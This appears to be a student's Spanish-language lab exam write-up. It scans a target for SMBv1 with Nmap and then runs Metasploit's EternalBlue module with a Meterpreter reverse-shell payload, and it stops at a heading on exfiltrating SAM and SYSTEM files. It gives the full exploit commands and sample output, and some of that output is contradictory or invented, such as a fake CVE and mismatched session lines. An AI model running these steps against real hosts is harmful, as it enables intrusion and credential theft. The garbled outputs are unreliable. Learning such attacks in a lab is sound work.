---
title: EXAMEN PARCIAL
date: 2024-11-03 20:01:00 -05:00
categories: [Made]
tags: [Made, GitHub]  # TAG names should always be lowercase
---


## 2.1. Escaneo de Red y Enumeración de Servicios (2 puntos)
Objetivo: Identificar servicios activos en la máquina objetivo, enfocándose en SMB y verificando la presencia de SMBv1.

Herramienta: Nmap

Comando:
nmap -p 137,138,139,445 --script smb-vuln* <IP_de_la_máquina_objetivo>

Explicación:

Este comando utiliza Nmap para escanear los puertos TCP 137, 138, 139 y 445, comúnmente asociados con el servicio SMB. El parámetro --script smb-vuln* ejecuta una serie de scripts de Nmap diseñados para detectar vulnerabilidades y obtener información detallada sobre el servicio SMB en la máquina objetivo. Estos scripts examinan la versión del protocolo SMB y buscan la presencia de SMBv1, identificada por la mención explícita de "SMBv1" o "NT LM 0.12" en la salida. La detección de vulnerabilidades específicas de SMBv1 también confirmaría su presencia. La dirección IP de la máquina objetivo debe reemplazarse con la IP real.

Resultados: (Aquí se debe incluir la salida del comando Nmap ejecutado. Esto mostrará los servicios encontrados, incluyendo información sobre SMB y su versión. Si SMBv1 está presente, se destacarán las líneas relevantes de la salida).

Ejemplo de salida (adaptar a la salida real):
...
PORT     STATE SERVICE    VERSION
139/tcp  open  netbios-ssn
| smb-vuln-cve200000001:
|   The server is vulnerable to CVE-2000-00001.
| smb-vuln-ms06-025:
|   The server is vulnerable to MS06-025.
| smb-vuln-ms07-029:
|   The server is vulnerable to MS07-029.
| smb-vuln-ms08-067:
|   The server is vulnerable to MS08-067.
445/tcp  open  microsoft-ds
...

## 2.2. Exploración de la Vulnerabilidad
**Objetivo:** Determinar si el servidor es vulnerable a la explotación EternalBlue (MS17-010) a través del servicio SMBv1.

**Herramienta:** Metasploit Framework

**Procedimiento:**

Se utilizará el framework Metasploit para verificar la vulnerabilidad y, si existe, obtener acceso remoto al servidor.  El módulo `exploit/windows/smb/ms17_010_eternalblue` se seleccionó debido a su capacidad de explotar la vulnerabilidad MS17-010 (EternalBlue) en el servicio SMBv1.  Esta vulnerabilidad permite la ejecución remota de código arbitrario en sistemas Windows vulnerables.

**Explicación del módulo `exploit/windows/smb/ms17_010_eternalblue`:**

Este módulo de Metasploit explota la vulnerabilidad MS17-010, una falla de seguridad en la implementación del protocolo SMBv1 de Microsoft.  La vulnerabilidad permite a un atacante remoto enviar un paquete especialmente diseñado que desencadena un desbordamiento de buffer en el servidor, lo que permite la ejecución de código arbitrario.  El módulo establece una *reverse shell*, lo que significa que el servidor vulnerable se conectará a la máquina atacante (la máquina desde donde se lanza el exploit) en un puerto específico, estableciendo una conexión inversa.  Esto permite al atacante controlar el servidor de forma remota.

**Pasos:**

1. **Iniciando Metasploit:** `msfconsole`

2. **Seleccionando el módulo:** `use exploit/windows/smb/ms17_010_eternalblue`

3. **Configurando el módulo:**  Se deben configurar las opciones del módulo, incluyendo la dirección IP del servidor objetivo (`RHOST`), el puerto de escucha para la reverse shell (`LPORT`), y posiblemente otras opciones dependiendo de la configuración del servidor.  Un ejemplo de configuración:
4. **Verificando la configuración:** `show options`

5. **Ejecutando el exploit:** `exploit`

**Resultados:** (Aquí se debe incluir la salida de la ejecución del exploit en Metasploit.  Si el exploit es exitoso, se establecerá una sesión Meterpreter con el servidor objetivo.  Si falla, se debe indicar el motivo del fallo y posibles causas).

Ejemplo de éxito (adaptar a la salida real):
[] Exploit completed, but no session was created.
[] Started reverse TCP handler on 4444
[] Sending exploit...
[] Exploit succeeded: successfully exploited.
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.101:445) at 2023-10-27 10:30:00 +0000

## 2.3. Configuración del Exploit en el Framework Metasploit
**Objetivo:** Configurar el exploit `exploit/windows/smb/ms17_010_eternalblue` en Metasploit, especificando los parámetros necesarios para establecer una conexión reverse shell con la máquina objetivo.

**Herramienta:** Metasploit Framework

**Parámetros críticos:**

* **`RHOST`:**  Representa la dirección IP de la máquina *víctima* o *objetivo*.  Este parámetro es crucial porque indica a Metasploit a qué sistema se debe enviar el exploit.  Sin la dirección IP correcta, el exploit no podrá alcanzar el servidor vulnerable.

* **`LHOST`:**  Representa la dirección IP de la máquina *atacante*.  Este parámetro es esencial porque define la dirección IP a la que la máquina víctima establecerá una conexión inversa (reverse shell) una vez que el exploit sea exitoso.  Metasploit escuchará en este puerto en la máquina atacante, esperando la conexión del servidor comprometido.

* **`LPORT`:**  Representa el puerto en la máquina atacante en el cual Metasploit escuchará las conexiones entrantes del servidor comprometido.  Se debe elegir un puerto que no esté en uso.  Generalmente se usa un puerto superior a 1024.

* **`PAYLOAD`:** Define el tipo de payload que se ejecutará en el servidor objetivo después de una explotación exitosa.  El payload `windows/x64/meterpreter/reverse_tcp` (o `windows/x86/meterpreter/reverse_tcp` dependiendo de la arquitectura del sistema objetivo) es una buena opción, ya que proporciona una sesión interactiva de Meterpreter, permitiendo al atacante controlar el sistema de forma remota.


**Configuración del Exploit:**
Después de iniciar Metasploit (`msfconsole`), se selecciona el módulo:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <IP_de_la_máquina_objetivo>
set LHOST <IP_de_la_máquina_atacante>
set LPORT <puerto_libre>  // Ejemplo: 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp  // O windows/x86/meterpreter/reverse_tcp según la arquitectura
exploit

## 2.3. 2.4. Ejecución del Exploit

**Objetivo:** Ejecutar el exploit configurado en la sección anterior y obtener una sesión Meterpreter en el servidor objetivo.

**Herramienta:** Metasploit Framework

**Procedimiento:**

Una vez configurados los parámetros del exploit `exploit/windows/smb/ms17_010_eternalblue` (como se describe en la sección 2.3), se ejecuta el comando `exploit` en la consola de Metasploit.

**Confirmación de la Conexión:**

Si el exploit tiene éxito, Metasploit mostrará un mensaje indicando que se ha establecido una sesión Meterpreter.  Este mensaje generalmente se parece a esto:

[*] Meterpreter session <número_de_sesión> opened (<dirección_IP_víctima>:<puerto_LPORT> -> <dirección_IP_atacante>:<puerto_SMB>) at <fecha_y_hora>
Donde:

* `<número_de_sesión>` es un número entero que identifica la sesión Meterpreter.
* `<dirección_IP_víctima>` es la dirección IP del servidor objetivo.
* `<puerto_LPORT>` es el puerto que se configuró en `LPORT`.
* `<dirección_IP_atacante>` es la dirección IP de la máquina atacante.
* `<puerto_SMB>` es el puerto SMB (generalmente 445) en la máquina objetivo.
* `<fecha_y_hora>` es la fecha y hora en que se estableció la sesión.


**Salida de Metasploit (Ejemplo de éxito):**

(Aquí se debe incluir la salida completa de la consola de Metasploit durante la ejecución del exploit.  Se debe destacar la línea que confirma el establecimiento de la sesión Meterpreter.  Si la explotación falla, se debe incluir la salida completa, incluyendo cualquier mensaje de error).

Ejemplo de salida exitosa:
[] Exploit completed, but no session was created.
[] Started reverse TCP handler on 4444
[] Sending exploit...
[] Exploit succeeded: successfully exploited.
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.101:445) at 2023-10-27 10:30:00 +0000
msf exploit(handler) >

## 2.5. Exfiltración de Archivos SAM y SYSTEM

